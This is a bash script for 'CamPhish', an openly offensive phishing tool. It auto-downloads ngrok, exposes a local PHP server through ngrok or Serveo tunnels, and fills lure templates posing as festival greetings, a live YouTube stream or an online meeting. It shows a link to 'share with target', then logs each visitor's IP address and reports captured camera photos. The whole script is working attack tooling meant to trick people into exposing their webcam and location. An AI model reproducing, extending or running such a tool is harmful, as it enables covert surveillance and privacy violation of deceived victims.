#!/bin/bash
# CamPhish v1.8 AUTO - Fully Automatic Cross-Platform Version
# Powered by Irsyah / PAZ
# Auto-detect device, download tools, auto-fallback ngrok→Serveo
# Credits: thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

# ============================================================================
# Platform detection
# ============================================================================
PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
IS_DARWIN=false
IS_LINUX=false
IS_TERMUX=false
IS_WINDOWS=false

case "$PLATFORM" in
	Darwin*) IS_DARWIN=true ;; 
	Linux*) 
		IS_LINUX=true
		if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
			IS_TERMUX=true
		fi
		;;
	MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
	*) ;;
esac

# Check if running in WSL (warning for user since they want non-WSL solutions)
is_wsl() {
	if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
		return 0
	fi
	if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
		return 0
	fi
	return 1
}

# ============================================================================
# Utilities
# ============================================================================
has_cmd() { command -v "$1" >/dev/null 2>&1; }

kill_port() {
	port="$1"
	if has_cmd fuser; then
		fuser -k ${port}/tcp > /dev/null 2>&1 || true
		return
	fi
	if has_cmd lsof; then
		pids=$(lsof -t -i tcp:"${port}" 2>/dev/null || true)
		if [ -n "$pids" ]; then
			echo "$pids" | xargs -r kill -2 >/dev/null 2>&1 || true
			return
		fi
	fi
	if has_cmd netstat && has_cmd awk && has_cmd grep; then
		pid=$(netstat -nlp 2>/dev/null | grep ":${port} " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
		if [ -n "$pid" ]; then
			kill -2 "$pid" >/dev/null 2>&1 || true
			return
		fi
	fi
}

# ============================================================================
# Banner & Output
# ============================================================================
banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.8 AUTO \e[0m \n"
printf " \e[1;91m Tools Name : SAP-SAP.TOOLS > PAZ.Pemuda Akhir Zaman \e[0m \n"
printf " \e[1;92m Jika kau mencintainya , maka dekati dulu sang pencitanya :> \e[0m \n"
printf "\n"
}

# ============================================================================
# Dependencies: check and suggest installations
# ============================================================================
dependencies() {
	printf "\e[1;92m[*] Checking dependencies...\e[0m\n"
	local missing=0
	
	if ! has_cmd php; then
		echo >&2 "ERROR: php not found. Install php-cli."
		missing=1
	fi
	if ! has_cmd curl && ! has_cmd wget; then
		echo >&2 "WARNING: curl/wget not found. Some operations may fail."
	fi
	if ! has_cmd ssh && ! $IS_WINDOWS; then
		echo >&2 "WARNING: ssh not found. Serveo fallback will fail."
	fi
	
	if [ $missing -eq 1 ]; then
		printf "\e[1;93m[!] Install missing dependencies first.\e[0m\n"
		exit 1
	fi
	printf "\e[1;92m[✓] Dependencies OK\e[0m\n"
}

# ============================================================================
# Stop function
# ============================================================================
stop() {
	printf "\e[1;91m[!] Stopping services...\e[0m\n"
	pkill -f -2 ngrok > /dev/null 2>&1 || true
	pkill -f -2 php > /dev/null 2>&1 || true
	pkill -f -2 ssh > /dev/null 2>&1 || true
	killall -2 ngrok ngrok.exe php ssh > /dev/null 2>&1 || true
	exit 1
}

# ============================================================================
# Catch IP and Camera
# ============================================================================
catch_ip() {
	ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
	printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] TARGET IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
	cat ip.txt >> saved.ip.txt
}

checkfound() {
	printf "\n"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl+C to exit\e[0m\n"
	while [ true ]; do
		if [[ -e "ip.txt" ]]; then
			printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened link! IP logged.\e[0m\n"
			catch_ip
			rm -rf ip.txt
		fi
		sleep 0.5
		if [[ -e "Log.log" ]]; then
			printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera photo captured!\e[0m\n"
			rm -rf Log.log
		fi
		sleep 0.5
	done
}

# ============================================================================
# Auto-download ngrok for all platforms
# ============================================================================
setup_ngrok() {
	# Check if ngrok already exists
	if [[ -x ./ngrok ]] || [[ -x ./ngrok.exe ]]; then
		printf "\e[1;92m[✓] ngrok already available\e[0m\n"
		return 0
	fi

	printf "\e[1;92m[*] Setting up ngrok...\e[0m\n"

	# Detect platform and architecture
	local ngrok_url=""
	local ngrok_file=""

	# Windows
	if $IS_WINDOWS; then
		ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
		ngrok_file="ngrok-windows-amd64.zip"
	# macOS
	elif [[ "$OSTYPE" == "darwin"* ]] || [[ "$PLATFORM" == "Darwin"* ]]; then
		local arch=$(uname -m)
		if [[ "$arch" == "arm64" ]] || [[ "$arch" == "aarch64" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
			ngrok_file="ngrok-darwin-arm64.zip"
		else
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
			ngrok_file="ngrok-darwin-amd64.zip"
		fi
	# Linux / Termux
	else
		local arch=$(uname -m)
		if [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
			ngrok_file="ngrok-linux-arm64.zip"
		elif [[ "$arch" == "armv7l" ]] || [[ "$arch" == "armv7" ]]; then
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
			ngrok_file="ngrok-linux-arm.zip"
		else
			ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
			ngrok_file="ngrok-linux-amd64.zip"
		fi
	fi

	# Download
	printf "\e[1;92m[+] Downloading ngrok...\e[0m\n"
	if has_cmd curl; then
		curl -L --max-time 60 "$ngrok_url" -o "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] curl download failed\e[0m\n"; return 1; }
	elif has_cmd wget; then
		wget --no-check-certificate --timeout=60 "$ngrok_url" -O "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] wget download failed\e[0m\n"; return 1; }
	else
		printf "\e[1;31m[!] No curl/wget available\e[0m\n"
		return 1
	fi

	# Extract
	printf "\e[1;92m[+] Extracting...\e[0m\n"
	if [[ -f "$ngrok_file" ]]; then
		if has_cmd unzip; then
			unzip -q "$ngrok_file" 2>/dev/null || { printf "\e[1;31m[!] unzip failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		elif has_cmd 7z; then
			7z x "$ngrok_file" > /dev/null 2>&1 || { printf "\e[1;31m[!] 7z failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		elif $IS_WINDOWS && has_cmd powershell; then
			powershell -Command "Expand-Archive -Path '$ngrok_file' -DestinationPath '.' -Force" 2>/dev/null || { printf "\e[1;31m[!] PowerShell extraction failed\e[0m\n"; rm -f "$ngrok_file"; return 1; }
		else
			printf "\e[1;31m[!] No extraction tool (unzip/7z/PowerShell)\e[0m\n"
			rm -f "$ngrok_file"
			return 1
		fi
		chmod +x ngrok ngrok.exe 2>/dev/null || true
		rm -f "$ngrok_file"
		printf "\e[1;92m[✓] ngrok ready\e[0m\n"
		return 0
	else
		printf "\e[1;31m[!] Download incomplete\e[0m\n"
		return 1
	fi
}

# ============================================================================
# Configure ngrok authtoken
# ============================================================================
setup_ngrok_auth() {
	printf "\e[1;92m[*] Configuring ngrok authtoken...\e[0m\n"
	
	local NGROK_CMD=""
	if $IS_WINDOWS && [[ -x ./ngrok.exe ]]; then
		NGROK_CMD="./ngrok.exe"
	elif [[ -x ./ngrok ]]; then
		NGROK_CMD="./ngrok"
	elif has_cmd ngrok; then
		NGROK_CMD="ngrok"
	else
		printf "\e[1;93m[!] ngrok executable not found\e[0m\n"
		return 1
	fi

	if [[ -f ~/.ngrok2/ngrok.yml ]]; then
		printf "\e[1;93m[?] Existing ngrok token detected. Use it? [Y/n]: \e[0m"
		read token_choice
		token_choice="${token_choice:-Y}"
		if [[ "$token_choice" != "N" && "$token_choice" != "n" ]]; then
			printf "\e[1;92m[✓] Using existing token\e[0m\n"
			return 0
		fi
	fi

	printf "\e[1;92m[+] Enter your ngrok authtoken (from https://dashboard.ngrok.com): \e[0m"
	read ngrok_auth
	
	if [[ -n "$ngrok_auth" ]]; then
		$NGROK_CMD authtoken "$ngrok_auth" > /dev/null 2>&1
		sleep 1
		printf "\e[1;92m[✓] Authtoken configured\e[0m\n"
		return 0
	else
		printf "\e[1;93m[!] No token provided, will try Serveo fallback\e[0m\n"
		return 1
	fi
}

# ============================================================================
# Start ngrok tunnel
# ============================================================================
try_ngrok() {
	# All debug output goes to stderr so it doesn't get captured
	local NGROK_CMD=""
	
	# Find ngrok
	if $IS_WINDOWS && [[ -x ./ngrok.exe ]]; then
		NGROK_CMD="./ngrok.exe"
	elif [[ -x ./ngrok ]]; then
		NGROK_CMD="./ngrok"
	elif has_cmd ngrok; then
		NGROK_CMD="ngrok"
	else
		echo "[!] ngrok not found" >&2
		return 1
	fi

	echo "[DEBUG] Starting: $NGROK_CMD http 3333" >&2
	
	# Start ngrok - output everything to ngrok.log
	$NGROK_CMD http 3333 > ngrok.log 2>&1 &
	local ngrok_pid=$!
	echo "[DEBUG] ngrok PID: $ngrok_pid" >&2
	
	# Wait for file to be created and written
	sleep 2
	
	# Check process still alive
	if ! kill -0 $ngrok_pid 2>/dev/null; then
		echo "[!] ngrok died immediately" >&2
		cat ngrok.log >&2
		return 1
	fi
	
	echo "[DEBUG] Polling for tunnel URL..." >&2
	
	# Poll for link - simpler version, just check the log file
	local attempts=0
	while [[ $attempts -lt 25 ]]; do
		attempts=$((attempts+1))
		
		# Check if link is in the log
		local link=$(grep -o 'https://[A-Za-z0-9.-]*\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
		if [[ -n "$link" ]]; then
			echo "[DEBUG] Found link: $link" >&2
			echo "$link"
			return 0
		fi
		
		# Show progress
		if (( attempts % 5 == 0 )); then
			echo "[DEBUG] Attempt $attempts/25..." >&2
		fi
		
		# Check if ngrok is still alive
		if ! kill -0 $ngrok_pid 2>/dev/null; then
			echo "[!] ngrok died" >&2
			cat ngrok.log >&2
			return 1
		fi
		
		sleep 1
	done
	
	# Timeout
	echo "[!] Timeout waiting for ngrok tunnel" >&2
	echo "[DEBUG] Last 20 lines of ngrok.log:" >&2
	tail -20 ngrok.log >&2
	kill $ngrok_pid 2>/dev/null || true
	return 1
}

# ============================================================================
# Start Serveo tunnel (fallback)
# ============================================================================
try_serveo() {
	printf "\e[1;92m[*] Attempting Serveo fallback...\e[0m\n"
	
	if ! has_cmd ssh; then
		printf "\e[1;93m[!] ssh not available (Serveo requires it)\e[0m\n"
		return 1
	fi

	# Generate random subdomain
	local subdomain="cam$RANDOM"
	
	printf "\e[1;92m[+] Starting SSH tunnel to serveo.net...\e[0m\n"
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1 &
	
	sleep 10
	
	# Extract URL from sendlink
	local link=""
	if [[ -f sendlink ]]; then
		link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
	fi

	if [[ -n "$link" ]]; then
		printf "\e[1;92m[✓] Serveo tunnel ready\e[0m\n"
		echo "$link"
		return 0
	else
		printf "\e[1;93m[!] Serveo failed\e[0m\n"
		return 1
	fi
}

# ============================================================================
# Setup templates
# ============================================================================
select_template() {
	printf "\n-----Choose template----\n"    
	printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
	printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
	printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
	
	printf "\e[1;92m[+] Choose: [Default 1] \e[0m"
	read option_tem
	option_tem="${option_tem:-1}"
	
	case $option_tem in
		1) read -p "Festival name: " fest_name; fest_name="${fest_name//[[:space:]]/}" ;;
		2) read -p "YouTube video ID: " yt_video_ID ;;
		3) printf "" ;;
		*) printf "\e[1;93m[!] Invalid choice\e[0m\n"; select_template; return ;;
	esac
}

payload() {
	link_esc=$(printf '%s' "$1" | sed 's/[&]/\\&/g')
	sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
	
	case $option_tem in
		1)
			sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
			sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
			;;
		2)
			sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
			sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
			;;
		3)
			sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index2.html
			;;
	esac
	rm -f index3.html
}

# ============================================================================
# MAIN: Auto-detect and run
# ============================================================================
main() {
	banner
	dependencies

	# Check if running in WSL and warn
	if is_wsl; then
		printf "\e[1;93m╔════════════════════════════════════════════════════════════╗\e[0m\n"
		printf "\e[1;93m║\e[0m\e[1;31m              WARNING: Running in WSL2                        \e[0m\e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  WSL networking may cause ngrok to fail. For best results:\e[0m\e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Use Git Bash (Windows native)\e[0m                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Use Termux for Windows\e[0m                               \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  - Or use Termux on Android for guaranteed success\e[0m       \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m                                                            \e[1;93m║\e[0m\n"
		printf "\e[1;93m║\e[0m  Trying anyway... (Serveo will be fallback)\e[0m            \e[1;93m║\e[0m\n"
		printf "\e[1;93m╚════════════════════════════════════════════════════════════╝\e[0m\n"
		printf "\n"
		sleep 3
	fi

	printf "\n\e[1;92m[*] Auto-setup mode\e[0m\n"

	# Kill any existing services
	printf "\e[1;92m[+] Cleaning up old processes...\e[0m\n"
	kill_port 3333
	kill_port 4040
	pkill -f -2 ngrok > /dev/null 2>&1 || true
	pkill -f -2 php > /dev/null 2>&1 || true
	sleep 1

	# Setup ngrok (auto-download)
	if ! setup_ngrok; then
		printf "\e[1;93m[!] ngrok setup failed, will try Serveo only\e[0m\n"
	else
		if ! setup_ngrok_auth; then
			printf "\e[1;93m[!] ngrok auth failed, will try Serveo\e[0m\n"
		fi
	fi

	# Select template
	select_template

	# Setup PHP server with binding for hotspots
	PHP_BIND="127.0.0.1"
	if $IS_TERMUX || $IS_WINDOWS; then
		PHP_BIND="0.0.0.0"
	fi

	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:3333\e[0m\n"
	
	# Start PHP server and capture output
	php -S ${PHP_BIND}:3333 > php.log 2>&1 < /dev/null &
	local php_pid=$!
	printf "\e[1;92m[+] PHP PID: $php_pid\e[0m\n"
	
	# Quick verify PHP started
	if ! kill -0 $php_pid 2>/dev/null; then
		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
		cat php.log || true
		stop
	fi
	
	printf "\e[1;92m[✓] PHP server running\e[0m\n"

	# Try ngrok first (unless in WSL), then Serveo
	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
	local link=""
	
	# In WSL, skip ngrok and use Serveo directly (better networking)
	if is_wsl; then
		printf "\e[1;93m[!] WSL detected - using Serveo tunnel (better networking)\e[0m\n"
		link=$(try_serveo)
	else
		printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
		link=$(try_ngrok) 
		
		if [[ -z "$link" ]]; then
			printf "\e[1;92m[+] ngrok failed, attempting Serveo fallback...\e[0m\n"
			link=$(try_serveo)
		fi
	fi

	if [[ -z "$link" ]]; then
		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
		printf "\e[1;93m[!] Possible reasons:\e[0m\n"
		printf "  - No internet connection\n"
		printf "  - Firewall blocking\n"
		printf "  - ngrok authtoken invalid\n"
		printf "  - Serveo service down\n"
		stop
	fi

	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n"
	printf "\n"
	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
	printf "\e[1;92m║\e[0m\e[1;77m              PUBLIC LINK READY - SHARE WITH TARGET       \e[0m\e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m║\e[0m\e[1;77m  %s\e[0m  \e[1;92m║\e[0m\n" "$link"
	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
	printf "\n"

	# Setup payload
	payload "$link"

	# Wait for targets
	checkfound
}

# ============================================================================
# Run
# ============================================================================
main "$@"
